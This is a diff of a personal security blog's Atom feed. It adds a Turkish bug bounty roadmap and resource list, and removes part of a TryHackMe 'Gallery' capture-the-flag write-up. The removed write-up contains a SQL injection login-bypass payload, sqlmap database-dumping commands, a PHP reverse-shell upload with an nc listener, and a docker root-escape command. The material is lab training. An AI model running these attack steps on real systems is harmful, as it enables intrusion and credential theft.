@@ -1,4 +1,191 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-02-17T22:45:08+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><entry><title type="html">Basics of Computer Technology and Networking</title><link href="http://localhost:4000/basics-of-computer-technology-and-networking/" rel="alternate" type="text/html" title="Basics of Computer Technology and Networking" /><published>2025-02-15T00:00:00+03:00</published><updated>2025-02-15T00:00:00+03:00</updated><id>http://localhost:4000/basics-of-computer-technology-and-networking</id><content type="html" xml:base="http://localhost:4000/basics-of-computer-technology-and-networking/"><![CDATA[<p>Basics of Computer Technology and Networking</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-03-24T14:21:33+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><entry><title type="html">Bir Türk Genci ve Bug Bounty</title><link href="http://localhost:4000/bir-turk-genci-ve-bug-bounty/" rel="alternate" type="text/html" title="Bir Türk Genci ve Bug Bounty" /><published>2025-03-23T00:00:00+03:00</published><updated>2025-03-23T00:00:00+03:00</updated><id>http://localhost:4000/bir-turk-genci-ve-bug-bounty</id><content type="html" xml:base="http://localhost:4000/bir-turk-genci-ve-bug-bounty/"><![CDATA[<p>Bir Türk Gencinin Çabası, Bug Bounty Nedir? Bug Bounty Yol Haritası</p>
+
+<p><br /></p>
+
+<h2 id="contents"><strong>Contents</strong></h2>
+<ul>
+  <li><a href="#bug-bounty-nedir"><strong>Bug Bounty Nedir?</strong></a></li>
+  <li><a href="#kendi-çabalarım"><strong>Kendi Çabalarım</strong></a></li>
+  <li><a href="#bug-bounty-yol-haritası-ve-kaynaklar"><strong>Bug Bounty Yol Haritası ve Kaynaklar</strong></a>
+    <ul>
+      <li><a href="#araştırma">Araştırma</a></li>
+      <li><a href="#temel-teknolojiler-ve-terimler">Temel Teknolojiler ve Terimler</a></li>
+      <li><a href="#güvenlik-açıkları">Güvenlik Açıkları</a></li>
+      <li><a href="#bug-bounty">Bug Bounty</a></li>
+      <li><a href="#recon">Recon</a></li>
+      <li><a href="#attack">Attack</a></li>
+      <li><a href="#bug-bounty-ile-alakalı-tüm-kaynaklar">Bug Bounty ile Alakalı Tüm Kaynaklar</a></li>
+      <li><a href="#lab-ortamları">Lab Ortamları</a></li>
+    </ul>
+  </li>
+</ul>
+
+<p><br />
+<br /></p>
+
+<h2 id="bug-bounty-nedir"><strong>Bug Bounty Nedir?</strong></h2>
+
+<p>Basitçe, şirketlerin belirlediği kurallar çerçevesinde bulduğunuz güvenlik açıkları karşılığında ödül aldığınız bir sistem. Bu sistemde aracı kuruluşlar var; HackerOne, Bugcrowd, Intigriti gibi ve kendi ülkemizde de olan Bugbounter gibi siteler. Hackerlar ile şirketler arasında bir bağlantı olurlar. Bizler de bu siteler aracılığıyla bulduğumuz güvenlik açıklarını raporlarız. Bu sayede de hem şirket fayda görür hem e biz ödül kazanabiliriz.</p>
+<h2 id="kendi-çabalarım"><strong>Kendi Çabalarım</strong></h2>
+
+<p>Fakir ama gönlü zengin bir genç olarak Bug Bounty’den bahsedeceğim. Bunları anlatıyorsun peki sen hiç para kazandın mı derseniz eğer kazanamadım. Hala deniyorum, pes etmedim, pes etmeyeceğim.</p>
+
+<p><img src="/assets/img/social/you-never-give-up-john-cena.gif" alt="dontgivup" /></p>
+
+<p>İşin özüne gelirsek eğer, birkaç yıl oldu bu işi deneyeli ve o zamanlar çok fazla bilgi sahibi değildim. İlgileniyordum bu işlerle fakat küçük şeylerle uğraşıyordum, kendime websitesi falan yapıyordum. Ama bundan çok zevk alıyordum. Küçük bir şeyi tasarlayıp bitirdiğimde, o websitesi hiçbir şeye benzemese de başarmışlık hissinin verdiği haz farklı oluyordu. Bu haz bir süre bu işlerle uğraşmaya devam etmeni sağlar fakat zaman ilerlediğinde para kazanman gerçekliğiyle yüzleşeceksin. Ben de yüzleştim bu gerçekle ve kötü yola düşmeden :smile: bir hacker olarak para kazanmanın yollarını aradım.</p>
+
+<p>Bu gerçek seni araştırmaya itiyo ve buluabileceğin en iyi sonuç freelancer çalışmak oluyor. İlgi alanına göre de ilerleyişin değişiyor tabi ki.</p>
+
+<p>Bu sırada da ben bug bounty olayını duydum ve büyülendim. Dışarıda bu işin içerisinde on yıllarını vermiş insanlar, bu olayı anlattığında kolay bir işmiş gibi duruyor. Ben de bu iş çok iyimiş, hemen yaparım dedim. Fakat öyle değil. Çok fazla çaba ve öğrenme süreci var ve bu süreci karşılıksız yapmak çok zor. Çünkü hayatımızda bir çok sorun bir çok derdin yanında okul falan derken uzun bir öğrenme sürecinde hedefinizi kovalamanız gerekiyor. Bu sadece bug bounty için değil bizim ülkemizdeki her gencin herhangi bir hayali için geçerli.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Bu süreçte öğrenme faslını hızlıca geçmeye çalıştığında ve sadece para kazanmaya odaklı ilerlediğinde en büyük hatayı yapıyorsun. İşin aslını kaçırıp yıllarca kendini oyalamaktan başka hiçbir şey yapmıyorusun.</code></strong></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Bu süreçte herhangi bir başarmışlık hissi almayacaksın. Zamanını harcayacaksın bu işi herşeyin haline getireceksin. Getireceksin ki güncel kalabilesin. Çevre kurucaksın. Başarmak için kolay bir yol yok. Bir disiplinin olacak ve ona uyacaksın, keyfine düşkünsen bu işte başarılı olamazsın. Öğrenmekten, oturup araştırmaktan, bilgisayar başında bir şeyler okumaktan zevk almıyorsan bu işte başarılı olamazsın. Ben bunun bir örneğiyim.</code></strong></p>
+
+<p><strong>Eğer üçkağıtçı değilseniz, suçlu veya siyasetçi değilseniz kimsenin hakkını yemiyorsanız kolay para diye bir şey hiç bir yerde yok.</strong></p>
+
+<ul>
+  <li>İş zor olacak, pes etmeyeceksin.</li>
+  <li>Para kazanmadan önce çok fazla zamanını ayıracaksın.</li>
+  <li>En temel bilgileri dahi okumaktan çekinmeyeceksin ve disiplinini bozmayacaksın.</li>
+  <li>İngilizcen de iyi olacak okuduğunu aşağı yukarı anlıyacaksın.</li>
+  <li>Gerisi sende</li>
+</ul>
+
+<p><img src="/assets/img/social/you-got-it-spongebob.webp" alt="gif" /></p>
+
+<p><br /></p>
+
+<h2 id="bug-bounty-yol-haritası-ve-kaynaklar"><strong>Bug Bounty Yol Haritası ve Kaynaklar</strong></h2>
+
+<p>Her şeyi sıfırdan anlatmayacağım. Linux öğrenin vesaire diye. Bunlar her halükarda bilmeniz gereken en temel şeyler.</p>
+
+<h2 id="araştırma"><strong>Araştırma</strong></h2>
+
+<p>Bu temel değil mi? Bu da temel ama herkesin atladığı bir temel. İnsanlara öğretmesi en zor olan şey araştırmak. Araştırma duygusuna sahip olun, bulabildiğiniz tüm kaynakları internette araştırın, öğrenmek istediğiniz şeyleri yazmaktan çekinmeyin en basit şeyi bile. Bilmemekten iyidir. Mesela uzak durulması gereken bir tür var bunlar her türlü +18 içeriği aratmasını bilir ama PDF nasıl dönüştürülür diye yazmaktan çekinir. :stop_sign: :facepunch:</p>
+
+<p>Bunu neden söylüyorum? Bug bounty güncel bir iş. Yeni web siteleri, yeni teknolojiler demek, yeni güvenlik açıkları demek. Bu yüzden sürekli bilmediğiniz şeyler karşınıza çıkacak. <code class="language-plaintext highlighter-rouge">Bu yüzden araştırmak bizim için daha daha önemli.</code></p>
+
+<h2 id="temel-teknolojiler-ve-terimler"><strong>Temel Teknolojiler ve Terimler</strong></h2>
+
+<p>Bug bounty’e özel olmayan fakat bilginiz dahilinde olması gereken şeyler de mevcut.  Çok daha genel ve siber güvenlik kavramını kapsayan terimler. Bunun için kesinlikle önerim <a href="https://roadmap.sh/cyber-security">Roadmap.sh’a</a> bakmanız. Burada çok kapsamlı bir bilgi ağacı var her biri çok değerli ve temelde sahip olmanız gereken bilgiler. Ve bu bilgileri kavramanız gerek.</p>
+
+<p>Bence İngilizce bir şeyi okuyup anlamak ile o bilgiyi kavramak arasında çok fark var. Zaten orada yazanlara bağlı kalmamanızı ve orada gördüğünüz şeyleri ayrıca araştırmanız gerekeceğini söylememe gerek yoktur herhalde.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Benim bu konuda izlediğim yol ise websitesi açmak. Websitesi açmaktaki sebep ise anlatmak. Bir bilgiyi kavramadan anlatmanız imkansız. O bilgiyi anlayıp kafanızda oturttuğunuz zaman o konuda bir şeyler anlatabilir olursunuz. Araştırın, öğrenin ve anlatın.</code></strong></p>
+
+<h2 id="güvenlik-açıkları"><strong>Güvenlik Açıkları</strong></h2>
+
+<p><code class="language-plaintext highlighter-rouge">Roadmap.sh'ta</code> yer alan temel her şeyi hallettiğinizde tabii ki her şeyi öğrenmiş olmuyorsunuz. <strong><code class="language-plaintext highlighter-rouge">Sizin için artık en önemli şey güvenlik açıklarını anlamak.</code></strong> Roadmap’te her şey çok detaylı değil. Sizin de artık yeni ve daha detaylı kaynaklara geçmeniz gerekiyor, araştırmalar yapmanız gerekiyor.  Web security içerisindeki güvenlik açıklarının çoğuna hakim olmanız gerekiyor. En iyi kaynak sizin en iyi anladığınız olacaktır. Ben <a href="https://youtube.com/playlist?list=PLwP4ObPL5GY940XhCtAykxLxLEOKCu0nT&amp;si=0NJlE6NnsNZZZ7H6">Mehmet INCE abinin</a>  videolarını yalayıp yutmanızı öneririm. Videoları tek seferde yalayıp yutmak zor, tekrar tekrar izleyin ve kavrayın. Sonrasında siz de anlatmaya çalışın ister yazarak yapın ister videoya alın. Ayrıca bu tür içerik yaratmak da sizin kariyeriniz için çok iyi olacaktır.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Güvenlik açıklarını araştırıp okuyup, izleyip kavradıktan sonra lablarda bunları uygulamalı test edin.</code></strong> TryHackMe benim en sevdiğim platform, arayüzü basit ve anlaşılır. Burada öğrendiğiniz güvenlik açıklarıyla alakalı labları bulun ve test edin. Bunun gibi birçok platform var. <a href="#bug-bounty-ile-alakalı-tüm-kaynaklar">Kaynaklar</a> kısmından bakabilirsiniz.</p>
+
+<p>İkinci önerim <a href="https://portswigger.net/web-security/all-labs">PortSwigger</a> olacak daha detaylı güvenlik açıklarını test edebiliyorsunuz.</p>
+
+<p><a href="http://testphp.vulnweb.com/">testphp.vulnweb’de</a>  benim en sevdiklerimden burada da birçok şeyi test edebilirsiniz.</p>
+
+<h2 id="bug-bounty"><strong>Bug Bounty</strong></h2>
+
+<p>Gel gelelim Bug bounty metodolojisine, araştırmayı öğrendik, güvenlik açıklarına hakimiz artık para kazanabiliriz. Değil mi? Herhalde kazanırız,  inşallah kazanırız.</p>
+
+<p><img src="/assets/img/social/detective-pikachu-anime.gif" alt="hope" /></p>
+
+<p>Bug bounty’de para ödüllü sitelerde rakipleriniz çok olacağından güvenlik açığı bulmak daha zor olacaktır. Öncelikle ödül vermeyen sitelerde şansınızı deneyebilirsiniz. Ben hiç denemedim.</p>
+
+<p>Bug Bounty metodolojisi olarak araştırdığınızda birçok farklı şey göreceksiniz ama olay temelde aynı; hedef hakkında bilgi toplayıp bulabildiğiniz bu bilgilerle güvenlik açığı yaratmak.</p>
+
+<p>Öncelikle hedefinizi belirleyin. Hedef belirleme önemli bir kısım. Kuralları dikkatli okuyun ve başlangıçta bol domainli sitelerde şanısnızı deneyin, ihtimallerinizi yükseltirsiniz.  Hedefinizi belirledikten sonra şunlar çok önemli; <strong><code class="language-plaintext highlighter-rouge">hedef sitenin yapısını anlamak, websitesinin amacını anlamak, ne yaptığını ve o site için ne olursa tehlikeli olur, bunları anlamak.</code></strong>  Bu saydıklarım öncelikli olarak bir websitesinde güvenlik açığı aramadan önce hakim olmanız gereken bilgilerdir.</p>
+
+<p>Güvenlik testlerinde sizin için en iyi araç Burp Suite olacaktır. Alternatif olarak istekleri izleyebilceğiniz postman veya caido gibi uygulamalarda var. Kullanması size hangisi daha rahat geliyor ise onu kullanın.</p>
+<h2 id="recon">Recon</h2>
+
+<p>Bilgi edinme olayına recon diyoruz ve recon içerisinde araç kullanmaktan çekinmemize gerek yok. Birçok araç var ve bunlarla bilgiler toplarsınız, bu konuda yazdığım <a href="https://github.com/Mr0Wido/otorecon">toolu</a> kullanabilirsiniz. Recon için oluşturduğum metodolojimde şu şkilde;</p>
+
+<p><img src="/assets/img/social/otorecon.png" alt="otorecon" /></p>
+
+<h2 id="attack">Attack</h2>
+
+<p>Bu bilgileri edindikten sonra bu bilgileri teker teker test etmek gerek. Güvenlik açığı testlerini otomatize etmek için toollar var fakat kesinlikle önermem. <strong><code class="language-plaintext highlighter-rouge">Toollar aptaldır.</code></strong>  Sadece verilen if-else’leri yaparlar. Akıllı olan biziz siteye göre ne arayacağımızı biliriz neye dikkat edeceğimizi biliriz, tool bilmez.</p>
+
+<p><code class="language-plaintext highlighter-rouge">Bu nedenle manuel olarak web sitesini test etmek bizim için çok daha verimli olacaktır. Bilgi toplamak için araç kullanabiliriz tespit ettiğimiz güvenlik açıklarını patlatmak için de araç kullanabiliriz ama güvenlik açığını tespit etmek için tool kullanmak bize hiçbir şey getirmez</code>.  Ama şu da var ki, bir Türk genci olmanın zorluğu olarak öğrenmeyi bekleyemiyecek durumda oluyoruz. Bu yüzden bir yandan toollarla şansınızı deneyip bir yandan da öğrenmeye devam etmeniz benim size önerim olur. Ben de bunu yapıyorum ve şu aracı <a href="https://github.com/Mr0Wido/otoattack">‘otoattack’</a> yeni bitirdim. Siz de deneyebilirsiniz. Belki şansınıza bulursunuz ve size öğrenmeye daha çok iter.</p>
+
+<p><img src="/assets/img/social/otoattack.png" alt="otoattack" /></p>
+
+<p>Güvenlik açıklarını raporlamak için de internette halka arz edilmiş birçok rapor var. Bulduğunuz güvenlik açıklarıyla alakalı raporlara bakın örnek ve güzel bir rapor yazın. Nasıl yazılacağı konusunda araştırmalar yapın.</p>
+
+<p>Bunların haricinde anlatacak bir şey yok. Bu iş kesinlikle basit bir şey değil ve toolardan da fazla ümit etmeyin işin asıl kısmını öğrenmeyi halledin. Ve gerisi gelecektir. İnternet nasıl işler bilmiyorken ben bug bounty yapacağım demeyin.</p>
+
+<p> Bunlar bu konudaki genel görüşlerimdi. Umarım yardımı dokunur. Kendinize iyi bakın.  :wave:</p>
+
+<h2 id="bug-bounty-ile-alakalı-tüm-kaynaklar"><strong>Bug Bounty ile Alakalı Tüm Kaynaklar</strong></h2>
+
+<ul>
+  <li><a href="https://github.com/akr3ch/BugBountyBooks/tree/main">Bug Bounty Books</a></li>
+  <li><a href="https://m0chan.github.io/2019/12/17/Bug-Bounty-Cheetsheet.html">@m0chan -  Bug Bounty Cheatsheet</a></li>
+  <li><a href="https://bugbountytuts.wordpress.com/wp-content/uploads/2019/01/dirty-recon-1.pdf">Recon Like A Boss</a></li>
+  <li><a href="https://pentestbook.six2dez.com/">@six2dez - pentest-book</a></li>
+  <li><a href="https://infosecwriteups.com/comprehensive-bug-bounty-hunting-checklist-2024-edition-4abb3a9cbe66">Comprehensive Bug Bounty Hunting Methodology</a></li>
+  <li><a href="https://pentester.land/blog/levelup-2018-the-bug-hunters-methodology-v3/">The Bug Hunters Methodology v3</a></li>
+  <li><a href="https://hadariel.pp.ua/aboutme/ethical-hacking/files/TBHMv4%20Recon.pdf">The Bug Hunter’s Methodology v4</a></li>
+  <li><a href="https://github.com/jhaddix/tbhm/tree/master">tbhm</a></li>
+  <li><a href="https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters/blob/master/assets/tools.md">Resources-for-Beginner-Bug-Bounty-Hunters</a></li>
+  <li><a href="https://github.com/trilokdhaked/Bug-Bounty-Methodology">Bug-Bounty-Methodology</a></li>
+  <li><a href="https://github.com/LuNiZz/websec101">websec101</a></li>
+  <li><a href="https://github.com/bugcrowd/bugcrowd_university">Bugcrowd University</a></li>
+  <li><a href="https://web.stanford.edu/class/cs253/">CS 253 Web Security</a></li>
+  <li><a href="https://github.com/bittentech/Bug-Bounty-Beginner-Roadmap">Bug-Bounty-Beginner-Roadmap</a></li>
+  <li><a href="https://github.com/ngalongc/bug-bounty-reference">bug-bounty-reference</a></li>
+  <li><a href="https://github.com/sbilly/awesome-security">awesome-security</a></li>
+  <li><a href="https://github.com/blaCCkHatHacEEkr/PENTESTING-BIBLE">PENTESTING-BIBLE</a></li>
+  <li><a href="https://github.com/daffainfo/AllAboutBugBounty">AllAboutBugBounty</a></li>
+  <li><a href="https://github.com/qazbnm456/awesome-web-security">awesome-web-security</a></li>
+  <li><a href="https://github.com/enaqx/awesome-pentest">awesome-pentest</a></li>
+  <li><a href="https://github.com/Hack-with-Github/Awesome-Hacking">Awesome-Hacking</a></li>
+</ul>
+
+<p><strong><code class="language-plaintext highlighter-rouge">TOOLS</code></strong></p>
+<ul>
+  <li><a href="https://github.com/vavkamil/awesome-bugbounty-tools">awesome bugbounty tools</a></li>
+  <li><a href="https://tomnomnom.com/talks/bash-bug-bounty.pdf">Bug Bounties With Bash</a></li>
+  <li><a href="https://bugbountyforum.com/tools/">Bug Bounty Forum</a></li>
+  <li><a href="https://github.com/hahwul/WebHackersWeapons?tab=readme-ov-file#tools">WebHackersWeapons</a></li>
+  <li><a href="https://github.com/0xPugal/One-Liners">One-Liners</a></li>
+  <li><a href="https://github.com/dwisiswant0/awesome-oneliner-bugbounty">Awesome One-liner Bug Bounty</a></li>
+  <li><a href="https://github.com/twseptian/oneliner-bugbounty">oneliner commands</a></li>
+  <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadsAllTheThings</a></li>
+  <li><a href="https://github.com/snoopysecurity/awesome-burp-extensions">Awesome Burp Extensions</a></li>
+  <li><a href="https://github.com/KingOfBugbounty/KingOfBugBountyTips">KingOfBugBountyTips</a></li>
+  <li><a href="https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets">Pentest-Cheat-Sheets</a></li>
+  <li><a href="https://github.com/edoardottt/awesome-hacker-search-engines">awesome-hacker-search-engines</a></li>
+  <li><a href="https://github.com/Mr0Wido/bug-bounty-tools">bug-bounty-tools</a>
+    <h2 id="lab-ortamları"><strong>Lab Ortamları</strong></h2>
+  </li>
+  <li><a href="https://tryhackme.com/dashboard">TryHackMe</a></li>
+  <li><a href="https://learn.cyberexam.io/dashboard">cyberexam</a></li>
+  <li><a href="https://ctf.hacker101.com/">hacker101</a></li>
+  <li><a href="https://www.bugbountyhunter.com/training/">BugBountyHunter</a></li>
+  <li><a href="https://overthewire.org/wargames/natas/">overthewire</a></li>
+  <li><a href="https://owasp.org/www-project-juice-shop/">OWASP Juice Shop</a></li>
+  <li><a href="https://app.hackinghub.io/hubs">hackinghub</a></li>
+  <li><a href="https://github.com/nahamsec/nahamsec.training">Nahamsec’s Intro To Bug Bounty Labs</a></li>
+  <li><a href="https://www.vulnhub.com/">vulnhub</a></li>
+  <li><a href="https://www.smashthestack.org/main.html">Smash The Stack</a></li>
+  <li><a href="https://www.root-me.org/?lang=en">rootme</a></li>
+  <li><a href="https://pwnable.xyz/">pwnable</a></li>
+  <li><a href="https://pentesterlab.com/">pentesterlab</a></li>
+  <li><a href="https://legacy.hacking-lab.com/events/">legacy</a></li>
+  <li><a href="https://exploit.education/">exploit-education</a></li>
+  <li><a href="https://cryptohack.org/">cryptohack</a></li>
+  <li><a href="https://github.com/cliffe/SecGen">SecGen</a></li>
+  <li><a href="https://github.com/moloch--/RootTheBox">RootTheBox</a></li>
+  <li><a href="https://picoctf.com/">picoCTF</a></li>
+  <li><a href="https://github.com/CTFd/CTFd">CTFd</a></li>
+  <li><a href="https://ctftime.org/">ctftime</a></li>
+</ul>
+
+<p><br />
+<br />
+<br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="Social" /><category term="security," /><category term="bug-bounty" /><category term="social" /><summary type="html"><![CDATA[Bir Türk Gencinin Çabası, Bug Bounty Nedir? Bug Bounty Yol Haritası]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/pic.jpg" /><media:content medium="image" url="http://localhost:4000/assets/img/pic.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Basics of Computer Technology and Networking</title><link href="http://localhost:4000/basics-of-computer-technology-and-networking/" rel="alternate" type="text/html" title="Basics of Computer Technology and Networking" /><published>2025-02-15T00:00:00+03:00</published><updated>2025-02-15T00:00:00+03:00</updated><id>http://localhost:4000/basics-of-computer-technology-and-networking</id><content type="html" xml:base="http://localhost:4000/basics-of-computer-technology-and-networking/"><![CDATA[<p>Basics of Computer Technology and Networking</p>
 
 <p><br /></p>
 
@@ -1387,255 +1574,4 @@ $ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 
 <p>It was nice CTF. I hope you learned something and had fun. But that’s it for now till next time take care :wave:</p>
 
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="sqli, xss, docker" /><summary type="html"><![CDATA[Can you take over The Marketplace’s infrastructure?]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/marketplace.png" /><media:content medium="image" url="http://localhost:4000/assets/img/marketplace.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Gallery</title><link href="http://localhost:4000/tryhackme-gallery/" rel="alternate" type="text/html" title="TryHackMe - Gallery" /><published>2023-05-10T00:00:00+03:00</published><updated>2023-05-10T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-gallery</id><content type="html" xml:base="http://localhost:4000/tryhackme-gallery/"><![CDATA[<p>Try to exploit our image gallery system.</p>
-
-<p><br /></p>
-
-<h2 id="1-deploy-and-get-a-shell">1. Deploy and get a Shell</h2>
-
-<p>Our gallery is not very well secured.</p>
-
-<p>Designed and created by <a href="https://twitter.com/mika_sec">Mikaa</a>!</p>
-
-<p><br /></p>
-
-<h3 id="11-how-many-ports-are-open">1.1 How many ports are open?</h3>
-
-<p>Let’s do a <code class="language-plaintext highlighter-rouge">nmap</code> scan.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.35.177
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/gallery/nmap.png" alt="nmap" /></p>
-
-<p>Two ports are open. These are <code class="language-plaintext highlighter-rouge">80/tcp HTTP, 8080/tcp HTTP</code></p>
-
-<p><strong><code class="language-plaintext highlighter-rouge">Answer : 2</code></strong></p>
-
-<p><br /></p>
-
-<h3 id="12-whats-the-name-of-the-cms">1.2 What’s the name of the CMS?</h3>
-
-<p>Let’s visit the website running on <code class="language-plaintext highlighter-rouge">80/tcp</code> port.</p>
-
-<p>An <code class="language-plaintext highlighter-rouge">Apache2 default</code> page appears.</p>
-
-<p>Let’s look at the websie runining on <code class="language-plaintext highlighter-rouge">8080/tcp</code> port.</p>
-
-<p>A login page appears.</p>
-
-<p><img src="/assets/img/tryhackme/gallery/login.png" alt="login" /></p>
-
-<p><strong><code class="language-plaintext highlighter-rouge">Answer : Simple Image Gallery</code></strong></p>
-
-<p><br /></p>
-
-<h3 id="13-whats-the-hash-password-of-the-admin-user">1.3 What’s the hash password of the admin user?</h3>
-
-<p>The Website is using <code class="language-plaintext highlighter-rouge">Simple image gallery</code>. I’m looking to see if I can find anything in <a href="https://www.exploit-db.com">exploit-db</a>.</p>
-
-<p>I found four results in <code class="language-plaintext highlighter-rouge">exploit-db</code>.</p>
-
-<p>I’m going through the first and second results, separately.</p>
-
-<p>First <a href="https://www.exploit-db.com/exploits/50214">Simple Image Gallery 1.0 - Remote Code Execution</a></p>
-
-<p><img src="/assets/img/tryhackme/gallery/rce1.png" alt="rce1" /></p>
-
-<p>I tried downloading and running the exploit first, but it didn’t work.</p>
-
-<p>When I looked through the code, I saw this.</p>
-
-<p><img src="/assets/img/tryhackme/gallery/rce2.png" alt="rce2" /></p>
-
-<p>It seems we can access the admin login with SQLi.</p>
-
-<p>We need to write this to the username; <code class="language-plaintext highlighter-rouge">admin' or '1'='1'#</code></p>
-
-<p>Let’s try.</p>
-
-<p><img src="/assets/img/tryhackme/gallery/rce3.png" alt="rce3" /></p>
-
-<p>Yes it works.</p>
-
-<p><img src="/assets/img/tryhackme/gallery/home.png" alt="home" /></p>
-
-<p>We were able to log in to the site as an admin. I’ve been browsing the site for a bit, let’s see what I can find.</p>
-
-<p>It seems we can upload files. Maybe we can upload a reverse shell.</p>
-
-<p>But first, I want to examine the other page in exploit-db.
-<a href="https://www.exploit-db.com/exploits/50198">Simple Image Gallery System 1.0 - ‘id’ SQL Injection</a></p>
-
-<p><img src="/assets/img/tryhackme/gallery/sql1.png" alt="sql1" /></p>
-
-<p>The page explains what to do.</p>
-
-<p><img src="/assets/img/tryhackme/gallery/sql2.png" alt="sql2" /></p>
-
-<p>We need to capture the request for a picture with Burp Suite.
-Right click &gt; Save item and we need to save the request and run it in sqlmap.</p>
-
-<p>Let ‘s do it.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r text.req --dbs
-</code></pre></div></div>
-
-<p>There are <code class="language-plaintext highlighter-rouge">Boolean Based</code> and <code class="language-plaintext highlighter-rouge">Time Based</code> vulnerabilities of SQLi types on the site.</p>
-
-<p><img src="/assets/img/tryhackme/gallery/kind.png" alt="kind" /></p>
-
-<p>With the <code class="language-plaintext highlighter-rouge">--dbs</code> tag, sqlmap will give us the database names.</p>
-
-<p><img src="/assets/img/tryhackme/gallery/databases.png" alt="databases" /></p>
-
-<p>Now that we know the database names, let’s get the tables.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r test.req -D &lt;database-name&gt; --tables 
-</code></pre></div></div>
-
-<p>I dumped the tables for <code class="language-plaintext highlighter-rouge">gallery_db</code>.</p>
-
-<p><img src="/assets/img/tryhackme/gallery/tables.png" alt="tables" /></p>
-
-<p>Now I will empty the columns of the <code class="language-plaintext highlighter-rouge">users</code> table.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r test.req -D gallery_db -T users --columns
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/gallery/columns.png" alt="columns" /></p>
-
-<p>Now let’s dump the <code class="language-plaintext highlighter-rouge">id, username, firstname, and password</code>.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r test.req -D gallery_db -T users -C id,username,firstname,password --dump
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/gallery/dump.png" alt="dump" /></p>
-
-<p><br /></p>
-
-<h3 id="14-whats-the-user-flag">1.4 What’s the user flag?</h3>
-
-<p>Let’s do a <code class="language-plaintext highlighter-rouge">gobuster</code> scan.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.35.177/gallery/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html,txt
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/gallery/gobuster.png" alt="gobuster" /></p>
-
-<p>The <code class="language-plaintext highlighter-rouge">/uploads</code> directory caught my attention. Maybe I can run the <code class="language-plaintext highlighter-rouge">reverse shell</code> that I will upload from this directory.</p>
-
-<p>Let’s try.</p>
-
-<p>First, go to albums, then create a new album, then you can upload files from inside the album.</p>
-
-<p>Let’s create and upload our reverse shell. <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">Pentestmonkey’s PHP Reverse Shell</a></p>
-
-<p><img src="/assets/img/tryhackme/gallery/upload.png" alt="upload" /></p>
-
-<p>Now I’m setting up a <code class="language-plaintext highlighter-rouge">netcat</code> listener on my own machine.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
-</code></pre></div></div>
-
-<p>Now let’s go to the <code class="language-plaintext highlighter-rouge">/uploads</code> directory and find the file we uploaded.</p>
-
-<p><img src="/assets/img/tryhackme/gallery/shell.png" alt="shell" /></p>
-
-<p>Yes it works.</p>
-
-<p><img src="/assets/img/tryhackme/gallery/in.png" alt="in" /></p>
-
-<p>I see two folders named <code class="language-plaintext highlighter-rouge">mike</code> and <code class="language-plaintext highlighter-rouge">ubuntu</code> in my <code class="language-plaintext highlighter-rouge">/home</code> directory.</p>
-
-<p><img src="/assets/img/tryhackme/gallery/users.png" alt="users" /></p>
-
-<p>We need Mike’s password for <code class="language-plaintext highlighter-rouge">user.txt</code>.</p>
-
-<p><img src="/assets/img/tryhackme/gallery/denied.png" alt="denied" /></p>
-
-<p>I didn’t know what to do and decided to run <a href="https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/README.md">linpeas.sh</a> on the target machine.</p>
-
-<p><img src="/assets/img/tryhackme/gallery/mikepass.png" alt="mikepass" /></p>
-
-<p>We found a password as you can see in the picture, but I don’t know who it belongs to.</p>
